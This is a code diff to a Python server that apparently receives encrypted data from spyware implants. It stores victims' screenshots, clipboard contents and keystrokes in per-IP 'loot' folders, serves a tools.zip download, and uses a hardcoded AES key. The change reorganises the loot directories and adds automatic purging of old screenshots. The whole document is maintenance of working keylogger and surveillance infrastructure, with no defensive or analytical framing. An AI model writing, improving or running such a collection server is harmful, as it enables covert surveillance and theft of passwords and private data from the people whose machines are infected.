@@ -15,16 +15,14 @@ from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 
-# --- CONFIGURATION SETTINGS -------------------------------------------------------------------------------- #
-SECRET_KEY     = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2' #
-IV             = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'                                     #
-HOST, PORT     = '0.0.0.0', 43558                                                                             #
-LOOT_DIR       = 'loot'                                                                                       #
-SCREENSHOT_DIR = os.path.join(LOOT_DIR, 'screenshots')                                                        #	
-KEYSTROKE_DIR  = os.path.join(LOOT_DIR, 'keystrokes')                                                         #
-CLIPBOARD_DIR  = os.path.join(LOOT_DIR, 'clipboard')                                                          #
-HTTP_PORT      = 26954  # HTTP file server port to download tools.zip                                         #
-# ----------------------------------------------------------------------------------------------------------- #
+# --- CONFIGURATION SETTINGS ----------------------------------------------------------------------------------------- #
+SECRET_KEY              = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2' #
+IV                      = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'                                     #
+HOST, PORT              = '0.0.0.0', 43558                                                                             #
+LOOT_DIR                = 'loot'                                                                                       #
+MAX_SCREENSHOT_DIR_SIZE = 500 * 1024 * 1024  # 500 MB per-IP cap                                                       #
+HTTP_PORT               = 26954  # HTTP file server port to download tools.zip                                         #
+# -------------------------------------------------------------------------------------------------------------------- #
 
 
 def timestamp():
@@ -65,6 +63,34 @@ def recv_exact(conn, n):
     return buf
 
 
+def purge_oldest_screenshots(img_dir):
+    """
+    If the total size of img_dir exceeds MAX_SCREENSHOT_DIR_SIZE,
+    delete oldest .jpg files (by filename order) until under the limit.
+    """
+    try:
+        # Gather only JPEGs in that directory
+        files = [f for f in os.listdir(img_dir) if f.lower().endswith('.jpg')]
+        if not files:
+            return
+
+        # Full paths, sorted by filename (timestamps → lexical order)
+        paths = sorted(os.path.join(img_dir, f) for f in files)
+
+        # Compute total size
+        total = sum(os.path.getsize(p) for p in paths)
+        # Remove oldest until under threshold
+        for p in paths:
+            if total <= MAX_SCREENSHOT_DIR_SIZE:
+                break
+            sz = os.path.getsize(p)
+            os.remove(p)
+            total -= sz
+
+    except Exception as e:
+        print(f"[!] {timestamp()} : Screenshot‑dir purge error in {img_dir}: {e}")
+
+
 def handle_connection(conn, addr):
     """
     Processes incoming data from a single client connection.
@@ -74,9 +100,10 @@ def handle_connection(conn, addr):
       - KEY|<ts>|<keys>: appends keystrokes to loot/<ip>.txt
     """
     ip = addr[0]
-    # Directory for this client's screenshots
-    img_dir = os.path.join(SCREENSHOT_DIR, ip)
-    os.makedirs(img_dir, exist_ok=True)
+    # Directory for this client
+    client_dir = os.path.join(LOOT_DIR, ip)
+    screenshot_dir = os.path.join(client_dir, 'screenshots')
+    os.makedirs(screenshot_dir, exist_ok=True)
 
     try:
         while True:
@@ -97,15 +124,16 @@ def handle_connection(conn, addr):
                 _, ts, b64 = payload.split('|', 2)
                 img_bytes = base64.b64decode(b64)
                 filename = f"{ts.replace(':', '-')}.jpg"
-                path = os.path.join(img_dir, filename)
+                path = os.path.join(screenshot_dir, filename)
                 with open(path, 'wb') as f:
                     f.write(img_bytes)
                 print(f"[+] {timestamp()} : Saved image to {path}")
+                purge_oldest_screenshots(screenshot_dir)
 
             elif payload.startswith('CLP|'):
                 _, ts, b64 = payload.split('|', 2)
                 clip = base64.b64decode(b64).decode('utf-8', errors='ignore')
-                path = os.path.join(CLIPBOARD_DIR, f"{ip}.txt")
+                path = os.path.join(client_dir, 'clipboard.txt')
                 with open(path, 'a', encoding='utf-8') as f:
                     f.write(f"{ts}: {clip}\n")
                 print(f"[+] {timestamp()} : Saved clipboard to {path}")
@@ -119,7 +147,7 @@ def handle_connection(conn, addr):
                 else:
                     # Unexpected format; log raw
                     line = payload + '\n'
-                path = os.path.join(KEYSTROKE_DIR, f"{ip}.txt")
+                path = os.path.join(client_dir, 'keystrokes.txt')
                 with open(path, 'a', encoding='utf-8') as f:
                     f.write(line)
                 print(f"[+] {timestamp()} : Saved keystrokes to {path}")
@@ -147,11 +175,8 @@ def main():
     Main entry: sets up directories, starts HTTP server, and begins listening
     for incoming encrypted data connections.
     """
-    # Ensure loot directories exist
+    # Ensure loot directory exists
     os.makedirs(LOOT_DIR, exist_ok=True)
-    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
-    os.makedirs(KEYSTROKE_DIR, exist_ok=True)
-    os.makedirs(CLIPBOARD_DIR, exist_ok=True)
 
     # Start HTTP file server (daemon thread)
     threading.Thread(target=start_http_server, daemon=True).start()
